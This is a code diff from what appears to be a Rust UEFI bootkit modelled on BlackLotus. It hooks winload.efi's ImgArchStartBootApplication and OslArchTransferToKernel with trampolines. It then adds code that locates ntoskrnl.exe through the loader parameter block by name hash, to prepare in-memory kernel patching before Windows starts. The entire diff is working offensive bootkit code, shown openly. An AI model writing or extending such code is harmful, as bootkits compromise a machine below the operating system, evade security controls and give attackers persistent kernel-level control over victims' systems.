@@ -5,6 +5,8 @@ use uefi::Handle;
 
 use crate::boot::utils::{pattern_scan, trampoline_hook64, trampoline_unhook};
 
+use super::{includes::_LOADER_PARAMETER_BLOCK, pe::{get_loaded_module_by_hash, dbj2_hash}};
+
 extern crate alloc;
 
 #[allow(non_camel_case_types)]
@@ -14,7 +16,7 @@ type ImgArchStartBootApplicationType = fn(app_entry: *mut u8, image_base: *mut u
 static mut ImgArchStartBootApplication: Option<ImgArchStartBootApplicationType> = None;
 
 #[allow(non_camel_case_types)]
-type OslArchTransferToKernelType = fn(loader_block: *mut u8, entry: *mut u8);
+type OslArchTransferToKernelType = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8);
 
 #[allow(non_upper_case_globals)]
 static mut OslArchTransferToKernel: Option<OslArchTransferToKernelType> = None;
@@ -86,7 +88,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
 
     // Print the winload.efi image base and OslArchTransferToKernel offset and image base
     log::info!("winload.efi: {:#x}", image_base as usize);
-    log::info!("OslArchTransferToKernel offset: {}", offset);
+    log::info!("OslArchTransferToKernel offset: {:#x}", offset);
     log::info!("winload.efi + OslArchTransferToKernel offset = {:#x}", (image_base as usize + offset));
 
     // Save the address of OslArchTransferToKernel
@@ -101,6 +103,8 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
         ).expect("Failed to perform trampoline hook on OslArchTransferToKernel");
     }
 
+    log::info!("Calling Original ImgArchStartBootApplication");
+
     // Call the original unhooked ImgArchStartBootApplication function
     unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
 }
@@ -108,7 +112,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
 /// OslArchTransferToKernel in winload.efi: Hooked to catch the moment when the OS kernel and some of the system drivers are 
 /// already loaded in the memory, but still haven’t been executed to perform more in-memory patching
 /// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
-fn osl_arch_transfer_to_kernel_hook(loader_block: *mut u8, entry: *mut u8) {
+fn osl_arch_transfer_to_kernel_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8) {
     
     // Unhook OslArchTransferToKernel and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(
@@ -118,7 +122,18 @@ fn osl_arch_transfer_to_kernel_hook(loader_block: *mut u8, entry: *mut u8) {
         )
     };
 
-    // Do kernel ninja shit here:
+    // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size 
+    let _kernel_entry = unsafe { 
+        get_loaded_module_by_hash(
+        loader_block, 
+        dbj2_hash("ntoskrnl.exe".as_bytes()
+        )).expect("Failed to get loaded module by name") 
+    };
+    //let image_base = unsafe { (*kernel_entry).DllBase };
+    //let image_size = unsafe { (*kernel_entry).SizeOfImage };
+
+    //log::info!("ntoskrnl.exe image base: {:p}", image_base);
+    //log::info!("ntoskrnl.exe image size: {:#x}", image_size);
 
     // Call the original unhooked OslArchTransferToKernel function
     unsafe { OslArchTransferToKernel.unwrap()(loader_block, entry) };
